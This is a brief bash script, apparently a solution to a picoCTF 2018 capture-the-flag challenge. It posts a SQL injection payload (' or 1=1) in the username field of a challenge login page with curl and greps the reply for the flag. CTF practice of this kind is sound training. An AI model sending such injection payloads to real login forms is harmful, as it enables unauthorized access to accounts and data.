#!/bin/bash

# web page with login page
# try SQLi
curl -s -X POST -d username="' or 1=1 ;" http://2018shell.picoctf.com:52012/login.php | grep -oE 'picoCTF{.*}'

# 'username is the name field of the input'
